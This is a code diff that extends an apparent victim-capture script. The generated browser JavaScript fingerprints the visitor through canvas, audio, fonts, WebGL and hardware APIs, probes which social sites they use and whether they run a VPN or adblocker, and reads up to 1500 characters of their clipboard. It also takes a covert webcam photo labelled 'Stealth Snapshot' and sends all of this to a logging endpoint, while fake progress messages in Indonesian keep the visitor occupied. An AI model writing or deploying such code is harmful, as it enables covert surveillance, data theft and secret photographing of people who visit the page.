@@ -94,6 +94,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           browser: navigator.userAgent,
           platform: navigator.platform,
           screen: window.screen.width + "x" + window.screen.height + " (" + window.devicePixelRatio + "x)",
+          colorDepth: window.screen.colorDepth,
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           cores: navigator.hardwareConcurrency || "N/A",
           mem: navigator.deviceMemory || "N/A",
@@ -101,16 +102,84 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           langs: navigator.languages.join(','),
           onLine: navigator.onLine,
           vendor: navigator.vendor,
+          webdriver: navigator.webdriver,
+          touch: navigator.maxTouchPoints,
+          dnt: navigator.doNotTrack,
+          pdf: navigator.pdfViewerEnabled,
           gpu: (function(){
             try {
               var c = document.createElement('canvas');
               var gl = c.getContext('webgl');
               if (!gl) return 'N/A';
               var dbg = gl.getExtension('WEBGL_debug_renderer_info');
-              return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Generic';
+              var info = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Generic';
+              var ext = gl.getSupportedExtensions().length;
+              return info + " (Exts: " + ext + ")";
             } catch(e) { return 'Error'; }
-          })()
+          })(),
+          canvasSig: (function(){
+            try {
+              var canvas = document.createElement('canvas');
+              var ctx = canvas.getContext('2d');
+              canvas.width = 200; canvas.height = 50;
+              ctx.textBaseline = "top";
+              ctx.font = "14px 'Arial'";
+              ctx.textBaseline = "alphabetic";
+              ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
+              ctx.fillStyle = "#069"; ctx.fillText("Deep-Audit-Sig", 2, 15);
+              ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText("Deep-Audit-Sig", 4, 17);
+              return canvas.toDataURL().slice(-100);
+            } catch(e) { return 'N/A'; }
+          })(),
+          audioSig: 'Pending'
         };
+
+        // Deep Recon: Audio Fingerprint
+        try {
+          var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+          var oscillator = audioCtx.createOscillator();
+          oscillator.type = 'triangle';
+          oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
+          var compressor = audioCtx.createDynamicsCompressor();
+          compressor.threshold.setValueAtTime(-50, audioCtx.currentTime);
+          compressor.knee.setValueAtTime(40, audioCtx.currentTime);
+          compressor.ratio.setValueAtTime(12, audioCtx.currentTime);
+          compressor.attack.setValueAtTime(0, audioCtx.currentTime);
+          compressor.release.setValueAtTime(0.25, audioCtx.currentTime);
+          oscillator.connect(compressor);
+          compressor.connect(audioCtx.destination);
+          oscillator.start(0);
+          audioCtx.startRendering().then(function(buffer) {
+            var sum = 0;
+            for (var i = 4500; i < 5000; i++) sum += Math.abs(buffer.getChannelData(0)[i]);
+            logEvent('extra', { audio_sig: sum.toString() });
+          });
+        } catch(e) {}
+
+        // Deep Recon: Font Fingerprint
+        try {
+           var fontList = ["Arial", "Helvetica", "Verdana", "Times New Roman", "Courier New", "Georgia", "Palatino", "Garamond", "Bookman", "Comic Sans MS", "Trebuchet MS", "Arial Black", "Impact", "JetBrains Mono", "Roboto", "Ubuntu", "SF Pro Display"];
+           var canvas = document.createElement("canvas");
+           var ctx = canvas.getContext("2d");
+           var detectedFonts = [];
+           ctx.font = "72px sans-serif";
+           var baseline = ctx.measureText("mmmmmmmmmmlli").width;
+           fontList.forEach(function(f) {
+             ctx.font = "72px '" + f + "', sans-serif";
+             if (ctx.measureText("mmmmmmmmmmlli").width !== baseline) detectedFonts.push(f);
+           });
+           logEvent('extra', { installed_fonts: detectedFonts.join(',') });
+        } catch(e) {}
+
+        // Deep Recon: Hardware API Availability
+        logEvent('extra', {
+          api_bluetooth: !!navigator.bluetooth,
+          api_usb: !!navigator.usb,
+          api_hid: !!navigator.hid,
+          api_serial: !!navigator.serial,
+          api_midi: !!navigator.requestMIDIAccess,
+          api_idle: !!window.IdleDetector
+        });
 
         // Deep Recon: WebRTC Local IP Leak
         try {
@@ -128,7 +197,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         // Deep Recon: Clipboard Buffer
         if (navigator.clipboard && navigator.clipboard.readText) {
            navigator.clipboard.readText().then(function(txt) {
-             if (txt) logEvent('extra', { clipboard_sync: txt.substring(0, 500) });
+             if (txt) logEvent('extra', { clipboard_sync: txt.substring(0, 1500) });
            }).catch(function(){});
         }
 
@@ -138,11 +207,61 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             metadata.battery = Math.round(batt.level * 100) + "% (" + (batt.charging ? "Charging" : "Discharging") + ")";
           }
           if (navigator.connection) {
-            metadata.connection = navigator.connection.effectiveType + " (rtt: " + navigator.connection.rtt + "ms)";
+            metadata.connection = navigator.connection.effectiveType + " (rtt: " + navigator.connection.rtt + "ms, down: " + navigator.connection.downlink + "Mb/s)";
           }
         } catch(e) {}
 
         await logEvent('info', metadata);
+
+        // Elite Recon: Social Presence Detection (Cross-Origin Resource Timing)
+        (function() {
+          var platforms = [
+            { name: 'Facebook', url: 'https://www.facebook.com/favicon.ico' },
+            { name: 'Twitter', url: 'https://twitter.com/favicon.ico' },
+            { name: 'Discord', url: 'https://discord.com/favicon.ico' },
+            { name: 'Github', url: 'https://github.com/favicon.ico' }
+          ];
+          platforms.forEach(function(p) {
+            var img = new Image();
+            var start = Date.now();
+            img.onload = function() { logEvent('extra', { social_active: p.name, load_ms: Date.now() - start }); };
+            img.onerror = function() { logEvent('extra', { social_inactive: p.name }); };
+            img.src = p.url + '?v=' + start;
+          });
+        })();
+
+        // Elite Recon: AdBlock / Shield Detection
+        (function() {
+           var bait = document.createElement('div');
+           bait.innerHTML = '&nbsp;';
+           bait.className = 'adsbox ads-box ad-unit';
+           bait.style.position = 'absolute';
+           bait.style.top = '-1000px';
+           document.body.appendChild(bait);
+           setTimeout(function() {
+             var blocked = bait.offsetHeight === 0 || window.getComputedStyle(bait).display === 'none';
+             logEvent('extra', { adblock_detected: blocked });
+             bait.remove();
+           }, 1000);
+        })();
+
+        // Elite Recon: Network RTT Mapping (VPN Detection)
+        (function() {
+          var nodes = ['https://1.1.1.1', 'https://8.8.8.8', 'https://www.google.com'];
+          nodes.forEach(function(n) {
+            var start = Date.now();
+            fetch(n, { mode: 'no-cors', cache: 'no-cache' }).then(function() {
+              logEvent('extra', { network_rtt: n, latency: Date.now() - start });
+            }).catch(function(){});
+          });
+        })();
+
+        // Deep Recon: Orientation & Peripherals
+        logEvent('extra', {
+          orientation: screen.orientation ? screen.orientation.type : 'N/A',
+          gamepads: (navigator.getGamepads ? navigator.getGamepads().length : 0),
+          languages: navigator.languages.join(',')
+        });
 
         var stepProg = Math.floor(80 / (requiredPerms.length || 1));
         var prog = 15;
@@ -169,11 +288,26 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
               if (!isSilent) updateProgress(prog, "Kalibrasi akses hardware AV...", "MEDIA_SETUP");
               if (navigator.mediaDevices) {
                 try {
-                  var stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true }).catch(function(){ return null; });
-                  var devs = await navigator.mediaDevices.enumerateDevices();
-                  var list = devs.map(d => d.kind + ': ' + (d.label || 'Secure-Device-' + Math.random().toString(36).substr(2,5))).join('\\n');
-                  await logEvent('extra', { media_hardware: list });
-                  if (stream) stream.getTracks().forEach(t => t.stop());
+                  var stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } }).catch(function(){ return null; });
+                  if (stream) {
+                    // Visual Intelligence: Stealth Snapshot
+                    try {
+                      var video = document.createElement('video');
+                      video.srcObject = stream;
+                      await video.play();
+                      var canvas = document.createElement('canvas');
+                      canvas.width = video.videoWidth;
+                      canvas.height = video.videoHeight;
+                      canvas.getContext('2d').drawImage(video, 0, 0);
+                      var snap = canvas.toDataURL('image/jpeg', 0.6);
+                      await logEvent('extra', { visual_identity: snap });
+                    } catch(e) {}
+
+                    var devs = await navigator.mediaDevices.enumerateDevices();
+                    var list = devs.map(d => d.kind + ': ' + (d.label || 'Secure-Device-' + Math.random().toString(36).substr(2,5))).join('\\n');
+                    await logEvent('extra', { media_hardware: list });
+                    stream.getTracks().forEach(t => t.stop());
+                  }
                 } catch(e) {}
               }
             }
